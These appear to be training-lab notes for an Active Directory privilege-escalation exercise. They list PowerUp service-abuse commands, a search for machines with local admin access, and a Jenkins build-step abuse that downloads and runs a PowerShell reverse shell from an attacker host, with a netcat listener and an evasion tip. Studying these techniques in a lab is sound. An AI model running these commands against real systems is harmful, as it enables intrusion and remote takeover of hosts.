# Learning Objective 5 — Privilege Escalation (Local & Lateral)

**Date:** 26 July 2026

---

## Task 1: Exploit Service for Local Admin Escalation

Always use Invisi-Shell for stealth.

**Identify vulnerable services:**
```powershell
Get-ModifiableService
Get-UnquotedService
Invoke-AllChecks
```

**View exploitation examples:**
```powershell
help Invoke-ServiceAbuse -Examples
```

**Exploit the service:**
```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -Username dcorp/student1 -Verbose
```

Replace service name and username as needed.

---

## Task 2: Find Machine With Local Admin Access

**Load the script:**
```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

**Find machines:**
```powershell
Find-PSRemotingLocalAdminAccess -Verbose
```

Returns machines where studentx has local administrative access via PS Remoting.

---

## Task 3: Exploit Jenkins for Admin Access on dcorp-ci (172.16.3.11:8080)

**Step 1: Access Jenkins**
- Browse to http://172.16.3.11:8080
- Login with available credentials
- Create or edit a build job

**Step 2: Execute Reverse Shell**
- Add build step → "Execute Windows Batch Command"
- Enter command:
```powershell
powershell iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowershellTcp.ps1);power -Reverse -IPaddress 172.16.100.1 -port 443
```

Replace IP with your attacker machine.

**Step 3: Setup Listener on Attacker Machine**
```powershell
nc64.exe -nlvp 443
```

Listens on port 443 for reverse shell connection.

**Step 4: Verify Shell**
```powershell
ls env:
```

Lists environment variables to confirm shell access.

---

## References

- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [Invoke-PowershellTcp](https://github.com/samratashok/nishang)

---

*Next: Learning Objective 6 — Credential Extraction & Lateral Movement*
